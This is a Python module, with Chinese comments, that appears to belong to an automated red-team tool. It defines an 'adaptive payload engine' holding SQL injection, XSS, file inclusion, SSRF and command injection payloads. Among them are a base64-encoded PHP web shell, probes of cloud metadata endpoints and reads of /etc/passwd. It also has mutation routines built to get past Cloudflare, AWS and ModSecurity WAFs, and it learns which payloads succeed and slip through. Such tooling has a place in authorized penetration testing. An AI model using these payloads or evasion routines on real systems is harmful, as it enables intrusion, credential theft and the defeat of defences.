#!/usr/bin/env python3
"""
自适应Payload引擎 v2.0
基于反馈学习、WAF绕过、目标特征自动选择最优Payload
"""

import json
import time
import hashlib
import logging
import random
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from collections import defaultdict
from pathlib import Path

logger = logging.getLogger(__name__)


@dataclass
class PayloadResult:
    """Payload执行结果"""
    payload: str
    success: bool
    blocked: bool = False
    response_time: float = 0.0
    evidence: str = ""


class AdaptivePayloadEngine:
    """自适应Payload引擎 - 基于反馈学习"""

    # Payload库
    PAYLOADS = {
        "sqli": {
            "error_based": [
                "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
                "1' AND '1'='1", "1 AND 1=1", "' OR 1=1--",
                "admin'--", "' UNION SELECT NULL--"
            ],
            "union_based": [
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT NULL,NULL,NULL--",
                "1 UNION SELECT @@version--",
                "' UNION ALL SELECT 1,2,3,4--"
            ],
            "blind_time": [
                "' AND SLEEP(5)--", "1' AND SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "1; SELECT SLEEP(5)--"
            ],
            "blind_bool": [
                "' AND 1=1--", "' AND 1=2--",
                "1' AND '1'='1", "1' AND '1'='2"
            ]
        },
        "xss": {
            "basic": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>"
            ],
            "event_handler": [
                "\" onmouseover=\"alert(1)",
                "' onfocus='alert(1)' autofocus='",
                "<body onload=alert(1)>"
            ],
            "encoded": [
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
                "%3Cscript%3Ealert(1)%3C/script%3E"
            ],
            "bypass": [
                "<scr<script>ipt>alert(1)</scr</script>ipt>",
                "<SCRIPT>alert(1)</SCRIPT>",
                "<img/src=x onerror=alert(1)>"
            ]
        },
        "lfi": {
            "basic": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd"
            ],
            "windows": [
                "..\\..\\..\\windows\\win.ini",
                "....\\\\....\\\\windows\\win.ini",
                "C:\\Windows\\win.ini"
            ],
            "encoded": [
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd%00"
            ],
            "wrapper": [
                "php://filter/convert.base64-encode/resource=index.php",
                "php://input",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
            ]
        },
        "ssrf": {
            "basic": [
                "http://127.0.0.1",
                "http://localhost",
                "http://[::1]"
            ],
            "cloud_metadata": [
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/",
                "http://169.254.169.254/metadata/v1/"
            ],
            "bypass": [
                "http://127.1", "http://0.0.0.0",
                "http://127.0.0.1.nip.io",
                "http://2130706433"  # 127.0.0.1 as decimal
            ]
        },
        "cmd": {
            "linux": [
                "; id", "| id", "& id", "`id`",
                "$(id)", "; cat /etc/passwd"
            ],
            "windows": [
                "& whoami", "| whoami", "; dir",
                "& type C:\\Windows\\win.ini"
            ],
            "blind": [
                "; sleep 5", "| sleep 5",
                "& ping -c 5 127.0.0.1",
                "; ping -n 5 127.0.0.1"
            ]
        }
    }

    # WAF绕过变异规则
    WAF_BYPASS = {
        "cloudflare": {
            "techniques": ["case_swap", "comment_split", "unicode"],
            "specific": ["/*!50000*/", "/**/"]
        },
        "aws_waf": {
            "techniques": ["double_encode", "case_swap", "hpp"],
            "specific": ["%2527", "%252f"]
        },
        "modsecurity": {
            "techniques": ["comment_split", "newline", "null_byte"],
            "specific": ["/*!", "%0a", "%00"]
        }
    }

    def __init__(self, history_file: Optional[Path] = None):
        self.history_file = history_file
        self.payload_stats: Dict[str, Dict] = defaultdict(lambda: {
            "success": 0, "fail": 0, "blocked": 0, "total_time": 0
        })
        self._load_history()

    def _load_history(self):
        """加载历史数据"""
        if self.history_file and self.history_file.exists():
            try:
                with open(self.history_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for k, v in data.items():
                        self.payload_stats[k].update(v)
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

    def _save_history(self):
        """保存历史数据"""
        if self.history_file:
            try:
                self.history_file.parent.mkdir(parents=True, exist_ok=True)
                with open(self.history_file, 'w', encoding='utf-8') as f:
                    json.dump(dict(self.payload_stats), f, indent=2)
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

    def _get_payload_key(self, vuln_type: str, payload: str) -> str:
        """生成Payload唯一键"""
        return f"{vuln_type}:{hashlib.md5(payload.encode()).hexdigest()[:8]}"

    def _calculate_score(self, vuln_type: str, payload: str, waf: Optional[str] = None) -> float:
        """计算Payload评分"""
        key = self._get_payload_key(vuln_type, payload)
        stats = self.payload_stats[key]

        total = stats["success"] + stats["fail"]
        if total == 0:
            # 新Payload，给予探索奖励
            base_score = 50.0
        else:
            success_rate = stats["success"] / total
            base_score = success_rate * 70

        # WAF绕过加分
        if waf and waf.lower() in self.WAF_BYPASS:
            if self._is_waf_bypass_payload(payload, waf):
                base_score += 15

        # 被拦截惩罚
        if stats["blocked"] > 2:
            base_score -= 20

        # 长度惩罚（太长的Payload可能被截断）
        if len(payload) > 100:
            base_score -= 5

        return max(0, min(100, base_score))

    def _is_waf_bypass_payload(self, payload: str, waf: str) -> bool:
        """检查是否为WAF绕过Payload"""
        waf_config = self.WAF_BYPASS.get(waf.lower(), {})
        specific = waf_config.get("specific", [])
        return any(s in payload for s in specific)

    def select_payloads(
        self,
        vuln_type: str,
        waf: Optional[str] = None,
        category: Optional[str] = None,
        top_n: int = 10
    ) -> List[Tuple[str, float]]:
        """选择最优Payload"""
        if vuln_type not in self.PAYLOADS:
            return []

        # 获取候选Payload
        candidates = []
        payload_dict = self.PAYLOADS[vuln_type]

        if category and category in payload_dict:
            candidates = payload_dict[category]
        else:
            for cat_payloads in payload_dict.values():
                candidates.extend(cat_payloads)

        # 如果有WAF，添加变异Payload
        if waf:
            mutated = []
            for p in candidates[:5]:  # 只变异前5个
                mutated.extend(self.mutate_payload(p, waf))
            candidates.extend(mutated)

        # 计算评分并排序
        scored = [(p, self._calculate_score(vuln_type, p, waf)) for p in candidates]
        scored.sort(key=lambda x: -x[1])

        # 添加随机探索（10%概率选择低分Payload）
        if random.random() < 0.1 and len(scored) > top_n:
            random_idx = random.randint(top_n, len(scored) - 1)
            scored[top_n - 1] = scored[random_idx]

        return scored[:top_n]

    def mutate_payload(self, payload: str, waf: Optional[str] = None) -> List[str]:
        """Payload变异"""
        mutations = []

        # 大小写混淆
        mutations.append(self._case_swap(payload))

        # URL编码
        mutations.append(self._url_encode(payload))

        # 双重URL编码
        mutations.append(self._double_encode(payload))

        # 注释分割（SQL）
        if any(kw in payload.lower() for kw in ["select", "union", "and", "or"]):
            mutations.append(self._comment_split(payload))

        # Unicode编码
        mutations.append(self._unicode_encode(payload))

        # WAF特定变异
        if waf and waf.lower() in self.WAF_BYPASS:
            waf_config = self.WAF_BYPASS[waf.lower()]
            for specific in waf_config.get("specific", []):
                mutations.append(payload.replace("'", specific))

        return [m for m in mutations if m != payload]

    def _case_swap(self, payload: str) -> str:
        """大小写混淆"""
        result = []
        for i, c in enumerate(payload):
            if c.isalpha():
                result.append(c.upper() if i % 2 == 0 else c.lower())
            else:
                result.append(c)
        return ''.join(result)

    def _url_encode(self, payload: str) -> str:
        """URL编码"""
        from urllib.parse import quote
        return quote(payload, safe='')

    def _double_encode(self, payload: str) -> str:
        """双重URL编码"""
        from urllib.parse import quote
        return quote(quote(payload, safe=''), safe='')

    def _comment_split(self, payload: str) -> str:
        """注释分割"""
        keywords = ["SELECT", "UNION", "AND", "OR", "FROM", "WHERE"]
        result = payload
        for kw in keywords:
            result = result.replace(kw, f"{kw[0]}/**/{''.join(kw[1:])}")
            result = result.replace(kw.lower(), f"{kw[0].lower()}/**/{''.join(kw[1:].lower())}")
        return result

    def _unicode_encode(self, payload: str) -> str:
        """Unicode编码"""
        return ''.join(f'\\u{ord(c):04x}' if c.isalpha() else c for c in payload)

    def record_result(self, vuln_type: str, payload: str, result: PayloadResult):
        """记录Payload执行结果"""
        key = self._get_payload_key(vuln_type, payload)

        if result.success:
            self.payload_stats[key]["success"] += 1
        else:
            self.payload_stats[key]["fail"] += 1

        if result.blocked:
            self.payload_stats[key]["blocked"] += 1

        self.payload_stats[key]["total_time"] += result.response_time
        self._save_history()

    def get_stats(self, vuln_type: Optional[str] = None) -> Dict[str, Any]:
        """获取统计信息"""
        if vuln_type:
            relevant = {k: v for k, v in self.payload_stats.items() if k.startswith(vuln_type)}
        else:
            relevant = dict(self.payload_stats)

        total_success = sum(v["success"] for v in relevant.values())
        total_fail = sum(v["fail"] for v in relevant.values())
        total_blocked = sum(v["blocked"] for v in relevant.values())

        return {
            "total_payloads": len(relevant),
            "total_success": total_success,
            "total_fail": total_fail,
            "total_blocked": total_blocked,
            "success_rate": total_success / max(total_success + total_fail, 1)
        }


# 全局实例
_engine_instance: Optional[AdaptivePayloadEngine] = None

def get_payload_engine() -> AdaptivePayloadEngine:
    """获取Payload引擎单例"""
    global _engine_instance
    if _engine_instance is None:
        import tempfile
        history_path = Path(tempfile.gettempdir()) / "autored_payload_history.json"
        _engine_instance = AdaptivePayloadEngine(history_file=history_path)
    return _engine_instance


def smart_select_payloads(vuln_type: str, waf: str = None, top_n: int = 10) -> List[str]:
    """智能选择Payload（便捷函数）"""
    engine = get_payload_engine()
    scored = engine.select_payloads(vuln_type, waf, top_n=top_n)
    return [p for p, _ in scored]


def mutate_for_waf(payload: str, waf: str) -> List[str]:
    """WAF绕过变异（便捷函数）"""
    engine = get_payload_engine()
    return engine.mutate_payload(payload, waf)
